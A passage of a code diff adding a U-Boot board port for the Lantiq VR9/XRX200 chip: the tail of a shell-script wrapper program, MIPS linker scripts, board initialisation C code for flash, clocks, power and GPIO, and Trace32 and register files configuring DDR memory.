+			scrpt = malloc(hide_z);
+			if (!scrpt)
+				return 0;
+			memset(scrpt, (int) ' ', hide_z);
+			memcpy(&scrpt[hide_z - text_z], text, text_z);
+		} else {
+			scrpt = text;	/* Script text */
+		}
+	} else {			/* Reexecute */
+		if (*xecc) {
+			scrpt = malloc(512);
+			if (!scrpt)
+				return 0;
+			sprintf(scrpt, xecc, argv[0]);
+		} else {
+			scrpt = argv[0];
+		}
+	}
+	j = 0;
+	varg[j++] = argv[0];		/* My own name at execution */
+	if (ret && *opts)
+		varg[j++] = opts;	/* Options on 1st line of code */
+	if (*inlo)
+		varg[j++] = inlo;	/* Option introducing inline code */
+	varg[j++] = scrpt;		/* The script itself */
+	if (*lsto)
+		varg[j++] = lsto;	/* Option meaning last option */
+	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
+	while (i < argc)
+		varg[j++] = argv[i++];	/* Main run-time arguments */
+	varg[j] = 0;			/* NULL terminated array */
+#if DEBUGEXEC
+	debugexec(shll, j, varg);
+#endif
+	execvp(shll, varg);
+	return shll;
+}
+
+int main(int argc, char ** argv)
+{
+#if DEBUGEXEC
+	debugexec("main", argc, argv);
+#endif
+#if !TRACEABLE
+	untraceable(argv[0]);
+#endif
+	argv[1] = xsh(argc, argv);
+	fprintf(stderr, "%s%s%s: %s\n", argv[0],
+		errno ? ": " : "",
+		errno ? strerror(errno) : "",
+		argv[1] ? argv[1] : "<null>"
+	);
+	return 1;
+}
diff --git a/board/vr9/u-boot-bootstrap.lds b/board/vr9/u-boot-bootstrap.lds
new file mode 100644
--- /dev/null
+++ b/board/vr9/u-boot-bootstrap.lds
@@ -0,0 +1,71 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start_bootstrap)
+SECTIONS
+{
+        . = 0x00000000;
+
+        . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+
+        . = ALIGN(4);
+        .rodata  : { *(.rodata) }
+
+        . = ALIGN(4);
+        .data  : { *(.data) }
+
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+
+	_gp = ALIGN(16);
+
+     . = ALIGN(16);
+	__got_start_bootstrap = .;
+	.got  : { *(.got) }
+	__got_end_bootstrap = .;
+
+	.sdata  : { *(.sdata) }
+
+	. = .;
+	__u_boot_cmd_start_bootstrap = .;
+	.u_boot_cmd : { *(.u_boot_cmd) }
+	__u_boot_cmd_end_bootstrap = .;
+
+    . = ALIGN(16);
+	uboot_end_data_bootstrap = .;
+	num_got_entries = (__got_end_bootstrap - __got_start_bootstrap) >> 2;
+
+        . = ALIGN(4);
+	.sbss  : { *(.sbss) }
+        .bss  : { *(.bss) }
+	uboot_end_bootstrap = .;
+}
diff --git a/board/vr9/u-boot.lds b/board/vr9/u-boot.lds
new file mode 100644
--- /dev/null
+++ b/board/vr9/u-boot.lds
@@ -0,0 +1,69 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+        . = 0x00000000;
+
+        . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+
+        . = ALIGN(4);
+        .rodata  : { *(.rodata) }
+
+        . = ALIGN(4);
+        .data  : { *(.data) }
+
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+
+	_gp = ALIGN(16);
+	. = ALIGN(16);
+	__got_start = .;
+	.got  : { *(.got) }
+	__got_end = .;
+
+	.sdata  : { *(.sdata) }
+
+	. = .;
+        __u_boot_cmd_start = .;
+        .u_boot_cmd : { *(.u_boot_cmd) }
+        __u_boot_cmd_end = .;
+
+	uboot_end_data = .;
+	num_got_entries = (__got_end - __got_start) >> 2;
+
+        . = ALIGN(4);
+	.sbss  : { *(.sbss) }
+        .bss  : { *(.bss) }
+	uboot_end = .;
+}
diff --git a/board/vr9/vr9.c b/board/vr9/vr9.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/vr9.c
@@ -0,0 +1,442 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+#include <config.h>
+#include <common.h>
+#include <command.h>
+#include <asm/addrspace.h>
+#include <asm/vr9.h>
+#include <environment.h>
+#include "dsl_address_define.h"
+#include <nand.h>
+#include <spi_flash.h>
+
+#if !defined(DEBUG_ENABLE_BOOTSTRAP_PRINTF) && defined(CFG_BOOTSTRAP_CODE)                                                                            
+#define printf                                                                                                                                        
+#endif   
+
+#ifndef CONFIG_ENV_SPI_BUS
+# define CONFIG_ENV_SPI_BUS 0
+#endif
+#ifndef CONFIG_ENV_SPI_CS
+# define CONFIG_ENV_SPI_CS      0
+#endif
+#ifndef CONFIG_ENV_SPI_MAX_HZ
+# define CONFIG_ENV_SPI_MAX_HZ  1000000
+#endif
+#ifndef CONFIG_ENV_SPI_MODE
+# define CONFIG_ENV_SPI_MODE    SPI_MODE_3
+#endif
+
+#ifdef CONFIG_NOR_FLASH_AUTO
+void save_extra_env()
+{
+   extern flash_info_t flash_info[CFG_MAX_FLASH_BANKS];
+   extern xway_flash_partition_map_info flash_map[];
+   int i,j,total_db,total_part;
+   int mtd_part;
+   u32  tmp;
+   char strTemp[32], strCommand[128];
+   char strimg_addr[32],strimg_size[32],strimg_end[32];
+   i=0;
+   while(flash_map[i].size !=0){
+    	 if(flash_map[i].size == flash_info[0].size>>20) break;
+    	 i++;
+    }
+   total_db = 0;
+   mtd_part = -1; 
+   total_part = 0;
+   for(j=0;j<XWAY_MAX_BLOCK_NUM;j++){
+   	     if(strcmp(flash_map[i].block[j].blockName,"")!=0){
+   	     	 total_db++;
+   	     	 
+   	     	 sprintf(strTemp,"data_block%d",j);
+   	     	 if(!getenv(strTemp)) setenv(strTemp, flash_map[i].block[j].blockName);
+           sprintf(strTemp,"f_%s_addr",flash_map[i].block[j].blockName);
+           sprintf(strimg_addr,"0x%08x",flash_map[i].block[j].startAddr);
+           if(!getenv(strTemp)) setenv(strTemp,strimg_addr);
+           if(flash_map[i].block[j].mtdNum!=mtd_part){
+   	     	    mtd_part = flash_map[i].block[j].mtdNum;
+   	     	    total_part ++;
+   	     	    sprintf(strTemp, "part%d_begin", j);
+   	     	    if(!getenv(strTemp)) setenv(strTemp,strimg_addr);	
+   	     	 }
+           
+           	sprintf(strTemp,"f_%s_size",flash_map[i].block[j].blockName);
+            sprintf(strimg_size,"0x%08x",flash_map[i].block[j].sizeBytes);
+            if(!getenv(strTemp)) setenv(strTemp,strimg_size);
+            sprintf(strTemp,"f_%s_end",flash_map[i].block[j].blockName);
+            sprintf(strimg_end,"0x%08x", flash_map[i].block[j].startAddr + flash_map[i].block[j].sizeBytes - 1);
+            if(!getenv(strTemp)) setenv(strTemp,strimg_end);
+             	
+            if(strcmp(flash_map[i].block[j].blockName,"ubootconfig")==0) {
+           	   sprintf(strCommand,"prot off 0x%08x %s;erase 0x%08x %s 1",\
+           	           flash_map[i].block[j].startAddr,strimg_end,\
+           	           flash_map[i].block[j].startAddr,strimg_end);
+           	   sprintf(strTemp,"reset_uboot_config");
+           	   if(!getenv(strTemp)) setenv(strTemp,strCommand);        
+           	
+            }
+            
+                       
+        }
+    } 
+    sprintf(strTemp, "%d", total_db);
+    if(!getenv(strTemp)) setenv("total_db", strTemp);
+    sprintf(strTemp, "%d", total_part);
+    if(!getenv(strTemp)) setenv("total_part", strTemp);
+    sprintf(strTemp, "0x%08x", 0xb0000000 + flash_info[0].size);
+    if(!getenv(strTemp)) setenv("flash_end", strTemp);
+    sprintf(strTemp, "mtdparts");
+    if(!getenv(strTemp)) setenv(strTemp,flash_map[i].mtdparts);	
+    	
+   return;
+}
+#endif
+
+
+
+phys_size_t initdram(int board_type)
+{
+	return (1024*1024*CONFIG_IFX_MEMORY_SIZE);
+}
+
+
+int flash_probe(void)
+{
+   (*BSP_EBU_BUSCON0)=0x1d7ff;  //value from Aikann, should be used on the real chip
+   (*BSP_EBU_ADDSEL0) = 0x10000031; //starting address from 0xb0000000
+   (*BSP_EBU_NAND_CON)=0;
+   return 1;
+}
+
+void fpi_dfe_reg_write(u32 offset, u32 data)
+{
+    REG32(FPIAD(offset)) = data;
+}
+
+u32 fpi_dfe_reg_read(u32 offset)
+{
+    return(REG32(FPIAD(offset)));
+}
+
+void afe_reg_write(u32 addr, u32 data)
+{
+    fpi_dfe_reg_write(V_AFE_SERIAL_ADDR, addr);
+    fpi_dfe_reg_write(V_AFE_SERIAL_WDATA, data);
+}
+
+
+unsigned short config_afe(void)
+{
+     *BSP_PMU_PWDCR &= ~(1<<9); /*turn on afe*/
+	 REG32(0xbf20302c) |= 0x40000000;
+	 fpi_dfe_reg_write(V_AFE_SERIAL_CFG, 0x90);
+	 afe_reg_write(0x324, 0x8402);	 
+	 REG32(0xbf20302c) &=~(0x40000000);
+     return 0;
+}
+
+void show_boot_progress(int arg)
+{
+  return;
+}
+
+void config_dcdc(u8 value)
+{
+#ifdef CONFIG_ENABLE_DCDC
+   u8 inc=0;
+   u8 orig=REG8(PDI_DCDC_DIG_REF);
+   u8 fuse_value;
+  
+   fuse_value=(u8)((REG32(0xBF107358) & 0xe0000) >>17);
+   REG8(PDI_DCDC_BIAS_VREG) |=(fuse_value & 0xf1); 
+
+   REG8(PDI_DCDC_DUTY_CYCLE_MAX_SAT) = 0x5A;  /*DUTY_CYCLE_SAT_MAX = 90*/ 
+   REG8(PDI_DCDC_DUTY_CYCLE_MIN_SAT) = 0x46;  /*DUTY_CYCLE_SAT_MIN = 70*/
+
+   REG8(PDI_DCDC_CONF_TEST_DIG) |=(u8)(1<<5); /*FREEZE_PID=1*/
+   
+   /*Programming of new coefficients (6 registers a 8 bits)*/
+   REG8(PDI_DCDC_PID_HI_B0) = 0x00;
+   REG8(PDI_DCDC_PID_LO_B0) = 0x00;
+   REG8(PDI_DCDC_PID_HI_B1) = 0xff;
+   REG8(PDI_DCDC_PID_LO_B1) = 0xe6;
+   REG8(PDI_DCDC_PID_HI_B2) = 0x00;
+   REG8(PDI_DCDC_PID_LO_B2) = 0x1b;
+#ifdef CONFIG_GRX200
+   REG8(PDI_DCDC_NON_OV_DELAY) = 0x5B;
+#else
+   REG8(PDI_DCDC_NON_OV_DELAY) = 0x8B;
+#endif
+
+   REG8(PDI_DCDC_DUTY_CYCLE_MAX_SAT) = 0x6C;     /*DUTY_CYCLE_SAT_MAX = 108 (0x6C)*/
+   REG8(PDI_DCDC_DUTY_CYCLE_MIN_SAT) = 0x3C;     /*DUTY_CYCLE_SAT_MIN = 60*/
+   REG8(PDI_DCDC_CONF_TEST_DIG) &=(u8)(~(1<<5)); /*FREEZE_PID=0*/
+  
+   REG8(PDI_DCDC_CLK_SET0) |= 0x40; /*Set bit 6, select PWM*/
+   REG8(PDI_DCDC_CLK_SET1) |= 0x20; 
+   REG8(PDI_DCDC_PWM0) = 0xF9; // 249 in decimal
+   
+   if(orig > value) inc=-1;
+	 else if(orig <value)	inc=1;
+	 else return;
+	 while( REG8(PDI_DCDC_DIG_REF)!= value)	
+	 {
+	 	  mdelay(1);
+	 	  REG8(PDI_DCDC_DIG_REF) +=inc; 
+	 }
+#else  /*turn off DCDC*/
+  REG8(PDI_DCDC_CONF_TEST_ANA) = 0x78;
+  REG8(PDI_DCDC_CONF_TEST_DIG) = 0x0;
+  REG8(PDI_DCDC_GENERAL) = 0x88;
+#endif
+}
+
+int check_pll1_lock(void)
+{
+   int result = 0;/*0 fail, 1 success*/
+   int i;
+#ifdef CONFIG_VR9_CRYSTAL_25M
+   u32 pll1_value[4]={0x984E6785,0x984E63C1,0x984E6B09,0x984E6F4D};
+   int LOOP = 4;
+#elif CONFIG_VR9_CRYSTAL_36M
+   u32 pll1_value[5]={0x9BA66545,0x9BA66809,0x9BA66ACD,0x9BA66D91,0x9BA67015};    
+   int LOOP = 5;
+
+#endif
+   for(i=0;i<LOOP;i++){
+     if(!(*BSP_PLL1_CFG & 0x2)) {
+	     if(i==LOOP-1) {
+               result = 0;
+			   printf("PLL1 lock failed!\n");
+			   break;
+		               }
+	     *BSP_PLL1_CFG &=~1;  /*disable PLL1*/
+		 *BSP_CGU_UPDATE |=1;
+		 *BSP_PLL1_CFG = pll1_value[i];
+		 *BSP_CGU_UPDATE |=1;
+		 mdelay(1);
+		 //printf("i=%d,PLL1_CFG=%08x\n",i,*BSP_PLL1_CFG);
+		 
+	     }
+     else{
+	         if((i!=0) && (i!= LOOP-1)){
+                  i=LOOP-2;
+				  *BSP_PLL1_CFG = pll1_value[LOOP-1];
+				  *BSP_CGU_UPDATE |=1;
+				  mdelay(1);
+				  //printf("2. i=%d,PLL1_CFG=%08x\n",i,*BSP_PLL1_CFG);
+                }else{
+                 result = 1;
+			     break;
+                }
+	      }/*if(!(*BSP_PLL1_CFG & 0x2))*/
+	 }/*for(i=0;i<LOOP;i++)*/
+   return result;
+}
+
+int checkboard (void)
+{
+
+    printf("CLOCK CPU %dM RAM %dM\n",CPU_CLOCK_RATE/1000000,RAM_CLOCK_RATE/1000000);
+#ifdef CONFIG_LTQ_SECURE_BOOT
+    printf("secure boot\n");
+#endif
+	config_afe();
+#ifdef CONFIG_VR9_CRYSTAL_25M	
+	REG8(0xbf106b00)=0x3;
+#endif	
+   
+    *EBU_ADDR_SEL_0 = 0x10000031; /*has to do this or nand probing will hang*/
+    *EBU_CON0 = CONFIG_EBU_BUSCON0;
+
+#ifndef CONFIG_VR9_CPU_393M_RAM_196M
+    if(!check_pll1_lock()) return 1;
+	
+#endif
+  
+   config_dcdc(0x7f);
+
+#ifdef CONFIG_GRX200 /*power gate DEF for GRX mode*/
+   REG32(BSP_PMU_PWCSR) = 0x31b ;
+#endif
+	return 0;
+}
+
+
+#ifdef CONFIG_NAND_FLASH
+void nand_gpio_init(void)
+{
+	  *BSP_GPIO_P3_DIR=0x2;
+    *BSP_GPIO_P3_ALTSEL0=0x3;
+    *BSP_GPIO_P3_ALTSEL1=0x0;
+    *BSP_GPIO_P3_OD=0x3;
+    
+    /* set GPIO pins for NAND */
+    /* P0.13 FL_A24 01:output*/
+    /* P1.8 FL_A23 01:output*/
+    *BSP_GPIO_P0_ALTSEL0 |= 0x2000;
+    *BSP_GPIO_P0_ALTSEL1 &= (~0x2000);
+    *BSP_GPIO_P0_DIR |= (0x2000);
+    *BSP_GPIO_P1_ALTSEL0 |= 0x100;
+    *BSP_GPIO_P1_ALTSEL1 &= (~0x100);
+    *BSP_GPIO_P1_DIR |= (0x100);
+    
+    /*Set GPIO7 as general GPIO output instead of parking at CFRAME*/ 
+    *BSP_GPIO_P0_ALTSEL0 &=(~0x80);
+    *BSP_GPIO_P0_ALTSEL1 &=(~0x80);
+    *BSP_GPIO_P0_DIR |= (0x80);
+    *BSP_GPIO_P0_DIR |= (0x80);
+    
+}
+#endif
+
+
+
+#ifdef CONFIG_LANTIQ_SPI
+
+int spi_gpio_init(unsigned int cs)
+{
+   /* enable SSC1 */
+        //*DANUBE_PMU_PM_GEN |= DANUBE_PMU_PM_GEN_EN11;
+
+        /* SSC1 Ports */
+        /* p0.15 SPI_CS1(EEPROM), P0.13 SPI_CS3, P0.9 SPI_CS5, P0.10 SPI_CS4, P0.11 SPI_CS6 */
+        /* Set p0.10 to alternative 01, others to 00 (In/OUT)*/
+        *(BSP_GPIO_P0_DIR) = (*BSP_GPIO_P0_DIR)|(0xAE00);
+
+        *(BSP_GPIO_P0_ALTSEL0) = (((*BSP_GPIO_P0_ALTSEL0)&(~0x0400)) & (~(0xAA00)));
+        *(BSP_GPIO_P0_ALTSEL1) = (((*BSP_GPIO_P0_ALTSEL1)|(0x0400)) & (~(0xAA00)) );
+
+        *(BSP_GPIO_P0_OD) = (*BSP_GPIO_P0_OD)|0xAE00;
+
+        /* p1.6 SPI_CS2(SFLASH), p1.0 SPI_DIN, p1.1 SPI_DOUT, p1.2 SPI_CLK */
+        *(BSP_GPIO_P1_DIR) = ((*BSP_GPIO_P1_DIR)|(0x46))&(~1);
+        *(BSP_GPIO_P1_ALTSEL0) = ((*BSP_GPIO_P1_ALTSEL0)|(0x47));
+        *(BSP_GPIO_P1_ALTSEL1) = (*BSP_GPIO_P1_ALTSEL1)&(~0x47);
+        *(BSP_GPIO_P1_OD) = (*BSP_GPIO_P1_OD)|0x0046;
+
+	 return 1;																					 
+}
+#endif
+
+#ifdef CONFIG_TUNE_DDR
+
+#define DDR_OFFSET     0xbf401000
+#define DDR_CCR39      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR40      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR43      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR44      (DDR_OFFSET + 0x02C0 )
+int get_tuned_param(ulong* buffer)
+{
+    int    ret= 1;
+    ulong  ddr_magic=0x88888888;
+    ulong  ecc;
+
+    if (REG32(CONFIG_TUNING_STATUS)!=0x2) {
+         ret = 0;
+         goto EXIT;
+    }
+
+    buffer[0]= ddr_magic;
+    buffer[1]= REG32(DDR_CCR39);
+    buffer[2]= REG32(DDR_CCR40);
+    buffer[3]= REG32(DDR_CCR43);
+    buffer[4]= REG32(DDR_CCR44);
+    buffer[5]= REG32(CSS_DDR_ECHO_DLL0);
+    buffer[6]= REG32(CSS_DDR_ECHO_DLL1);
+    buffer[7]= buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+EXIT:
+    return ret;
+}
+
+
+#ifdef CONFIG_BOOT_FROM_NOR
+void save_ddr_param(void)
+{
+         int rcode;
+	 ulong erase_addr1=0, erase_addr2=0;
+	 ulong  buffer[8];
+	 erase_addr1 = IFX_CFG_FLASH_DDR_CFG_START_ADDR; 
+	 erase_addr2 = IFX_CFG_FLASH_DDR_CFG_START_ADDR + IFX_CFG_FLASH_DDR_CFG_SIZE;
+  
+         if(!get_tuned_param(&buffer)) return; 
+
+         if(flash_sect_protect (0, erase_addr1, erase_addr2-1))
+         {
+	      printf("protect off error!\n");
+	 }
+									 
+         if (flash_sect_erase (erase_addr1, erase_addr2-1))
+         {
+	       printf("erase error!\n");
+	 }
+	 rcode = flash_sect_erase(erase_addr1, erase_addr2-1);
+    
+
+	 flash_write((char *)buffer, IFX_CFG_FLASH_DDR_CFG_START_ADDR, 32);
+
+	 //(void) flash_sect_protect (1, erase_addr1, erase_addr2-1);
+										
+     return;
+}
+#elif defined(CONFIG_BOOT_FROM_NAND)
+extern nand_info_t nand_info[]; 
+//extern int nand_write (struct mtd_info *mtd, loff_t to, size_t len, size_t * retlen, const u_char * buf);
+
+void save_ddr_param(void)
+{   
+	   ulong  buffer[8];
+	   nand_info_t *nand=&nand_info[0];
+	   u64 srcLen=32;
+           if(!get_tuned_param(&buffer)) return; 
+	   nand_write_partial(&nand_info[0], IFX_CFG_FLASH_DDR_CFG_START_ADDR, &srcLen, (u_char*)buffer);
+	   printf("saved ddr param in flash!\n");
+           return;
+}
+#else /*BOOT from SPI*/
+void save_ddr_param(void)
+{
+	 ulong  buffer[8];
+	 static struct spi_flash *flash_spi;
+	 flash_spi = spi_flash_probe(CONFIG_ENV_SPI_BUS, CONFIG_ENV_SPI_CS,
+            CONFIG_ENV_SPI_MAX_HZ, CONFIG_ENV_SPI_MODE);
+         if(!get_tuned_param(&buffer)) return;	
+	 spi_flash_write(flash_spi, IFX_CFG_FLASH_DDR_CFG_START_ADDR, 32, (char *)buffer);   
+	 printf("saved ddr param in flash!\n");    
+	    
+	 return; 
+}
+#endif
+#endif
+
+extern int vr9_eth_initialize(bd_t * bis);
+
+int board_eth_init(bd_t *bis)
+{
+   if (vr9_eth_initialize(bis)<0)
+             return -1;
+
+	return 0;
+}
+						 
diff --git a/board/vr9/xrx200_ddr1_197_config.cmm b/board/vr9/xrx200_ddr1_197_config.cmm
new file mode 100644
--- /dev/null
+++ b/board/vr9/xrx200_ddr1_197_config.cmm
@@ -0,0 +1,87 @@
+;********************************************************************
+;Trace 32 script to Config DDR Setting for XRX200
+;********************************************************************
+;Target DDR1, Clock Frequency 196Mhz
+;********************************************************************
+;********************************************************************
+; Target :
+;********************************************************************
+;
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+;Initialize memory controller register		
+;Pls refer to the documentation to change the necessary parameter to		
+;Suit the DDR device you are using
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++		
+;		
+data.set 0xBF401070 %long	0x0	; Put DDR controller inactive
+;		
+;DDR Register programming		
+data.set 0xBF401000 %long	0x101	
+data.set 0xBF401010 %long	0x1000100	
+data.set 0xBF401020 %long	0x1010000	
+data.set 0xBF401030 %long	0x100	
+data.set 0xBF401040 %long	0x1000000	
+data.set 0xBF401050 %long	0x1000101	
+data.set 0xBF401060 %long	0x1000100	;Program base on DDR device use (Infineon type use 2.5 value 605)
+data.set 0xBF401070 %long	0x1010000	;Program for burst lenght and write recovry time
+data.set 0xBF401080 %long	0x1000001	
+data.set 0xBF401090 %long	0x0
+data.set 0xBF4010A0 %long	0x2000100	
+data.set 0xBF4010B0 %long	0x3000301	;Parameter needed from DDR spec.
+data.set 0xBF4010C0 %long	0x0	
+data.set 0xBF4010D0 %long	0x202	
+data.set 0xBF4010E0 %long	0x5060A0F	
+data.set 0xBF4010F0 %long	0x2000F	;Default Write DQS Out to 0x20
+data.set 0xBF401100 %long	0x30000	
+data.set 0xBF401110 %long	0x60102	; if txsnr = 75ns; value = 75/6 ~= 13 = 0xd
+data.set 0xBF401120 %long	0x3020002	
+data.set 0xBF401130 %long	0x10102	;use 0x200 to have 2 pin less than 15 for address for 256Mbit DDR
+data.set 0xBF401140 %long	0x5000000	;use 0xa03 as we are going to use column size of 10 address
+data.set 0xBF401150 %long	0x30C0200	;default read delay use for Danube Ref. Board with Qimonda DDR, tuning will be done"
+data.set 0xBF401160 %long	0x0	;default read delay use for Danube Ref. Board with Qimonda DDR, tuning will be done"
+data.set 0xBF401170 %long	0x9020000	;disable ECC
+data.set 0xBF401180 %long	0xF03	;Default DQS out shift.. tuning will be done to it.
+data.set 0xBF401190 %long	0x0	
+data.set 0xBF4011A0 %long	0x0	
+data.set 0xBF4011B0 %long	0x320000	
+data.set 0xBF4011C0 %long	0x0	;this is periodic refresh cycle? 7.8us /6ns 0x514
+data.set 0xBF4011D0 %long	0x0	;calculate value ..
+data.set 0xBF4011E0 %long	0x5F9	;init delay spec stated 200us needed 0x8235
+data.set 0xBF4011F0 %long	0x0	 ;Extended mode register programming... not req
+data.set 0xBF401200 %long	0x0	
+data.set 0xBF401210 %long	0x0	
+data.set 0xBF401220 %long	0x200C8	
+data.set 0xBF401230 %long	0x1135CA	
+data.set 0xBF401240 %long	0xC8
+data.set 0xBF401250 %long	0x99AD
+data.set 0xBF401260 %long	0x0
+data.set 0xBF401270 %long	0x211510
+data.set 0xBF401280 %long	0x211510
+;data.set 0xBF401290 %long	0x211F66
+;data.set 0xBF4012A0 %long	0x211F66
+data.set 0xBF4012B0 %long	0x66701B
+data.set 0xBF4012C0 %long	0x66701B
+;data.set 0xBF4012D0 %long	0x665F1B
+;data.set 0xBF4012E0 %long	0x665F1B
+;data.set 0xBF4012F0 %long	0x0
+;data.set 0xBF401300 %long	0x0
+;data.set 0xBF401310 %long	0x0
+;data.set 0xBF401320 %long	0x0
+data.set 0xBF401330 %long	0x0
+data.set 0xBF401340 %long	0xF1133	
+data.set 0xBF401350 %long	0xF3014B26	
+data.set 0xBF401360 %long	0xF3014B26	
+;data.set 0xBF401370 %long	0xF3014B26	
+;data.set 0xBF401380 %long	0xF3014B26	
+data.set 0xBF401390 %long	0x7C00301	
+data.set 0xBF4013A0 %long	0x7C00301	;optional can try 0x500 for 2.5 cycle cas
+;data.set 0xBF4013B0 %long	0x7C00301	
+;data.set 0xBF4013C0 %long	0x7C00301	
+data.set 0xBF4013D0 %long	0x4	
+
+;Enable memory controller and DDR		
+data.set 0xBF401070 %long	0x1010100	; put DDR controller into active
+
+
+
+
diff --git a/board/vr9/xrx200_ddr1_197_config.conf b/board/vr9/xrx200_ddr1_197_config.conf
new file mode 100644
--- /dev/null
+++ b/board/vr9/xrx200_ddr1_197_config.conf
@@ -0,0 +1,55 @@
+0xBF401070 0x0	
+0xBF401000 0x101	
+0xBF401010 0x1000100	
+0xBF401020 0x1010000	
+0xBF401030 0x100	
+0xBF401040 0x1000000	
+0xBF401050 0x1000101	
+0xBF401060 0x1000100	
+0xBF401070 0x1010000	
+0xBF401080 0x1000001	
+0xBF401090 0x0
+0xBF4010A0 0x2000100	
+0xBF4010B0 0x3000301	
+0xBF4010C0 0x0	
+0xBF4010D0 0x202	
+0xBF4010E0 0x5060A0F	
+0xBF4010F0 0x2000F	
+0xBF401100 0x30000	
+0xBF401110 0x60102	
+0xBF401120 0x3020002	
+0xBF401130 0x10102	
+0xBF401140 0x5000000	
+0xBF401150 0x30C0200	
+0xBF401160 0x0	
+0xBF401170 0x9020000
+0xBF401180 0xF03	
+0xBF401190 0x0	
+0xBF4011A0 0x0	
+0xBF4011B0 0x320000	
+0xBF4011C0 0x0	
+0xBF4011D0 0x0	
+0xBF4011E0 0x5F9	
+0xBF4011F0 0x0	 
+0xBF401200 0x0	
+0xBF401210 0x0	
+0xBF401220 0x200C8	
+0xBF401230 0x1135CA	
+0xBF401240 0xC8
+0xBF401250 0x99AD
+0xBF401260 0x0
+0xBF401270 0x211510
+0xBF401280 0x211510
+0xBF4012B0 0x66701B
+0xBF4012C0 0x66701B
+0xBF401330 0x0
+0xBF401340 0xF1133	
+0xBF401350 0xF3014B26	
+0xBF401360 0xF3014B26	
+0xBF401390 0x7C00301	
+0xBF4013A0 0x7C00301	
+0xBF4013D0 0x4	
+0xBF401070 0x1010100	
+
+
+
diff --git a/board/vr9/xrx200_ddr2_197_CAS4_config.cmm b/board/vr9/xrx200_ddr2_197_CAS4_config.cmm
new file mode 100644
--- /dev/null
+++ b/board/vr9/xrx200_ddr2_197_CAS4_config.cmm
@@ -0,0 +1,130 @@
+;********************************************************************	
+;Trace 32 script to load DDR tuning software for XRX200	
+;	
+;********************************************************************	
+;This script is to be use with xrx200_ddr_tune.bin for XWAY chipset	
+;For Detail on how to use this script pls refer to	
+;DDR tuning documentation which come with this script	
+;Please keep a default copy of this script with default value before	
+;modified the MC_DC parameter to suit the DDR device you use	
+;You also need the board console connected to activate the test	
+;and display the result	
+;********************************************************************	
+; Target : 	HYB25DC25616OCE
+;********************************************************************
+
+; Setup Lauterbach debugger for XRX200
+;SYStem.down
+;SYStem.cpu MIPS34k
+;SYStem.JTAGCLOCK 20000000.
+;SYSTEM.OPTION ENDIANESS BIG
+;SYStem.UP
+
+; Setup XRX200 CGU for 500/250
+;data.set 0xBF103010 %long 0x12 ; program the CPU/DDR speed
+;data.set 0xBF103014 %long 0x000200F8 ; Program Sram bus, FPI bus & AHB bus speed."
+
+;data.set 0xBF103028 %long 0x200000 ; set class II DDR drive Class II driver not supported
+;data.set 0xBF400410 %long 0x3F ; Set Class II pads driver in the DDR module ; TODO to clarify programming
+
+; CGU update		
+;data.set 0xBF103020 %long 0x01		
+
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++		
+;Initialize memory controller register		
+;Pls refer to the documentation to change the necessary parameter to		
+;Suit the DDR device you are using		
+;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++		
+;		
+data.set 0xBF401070 %long	0x0	; Put DDR controller inactive
+;		
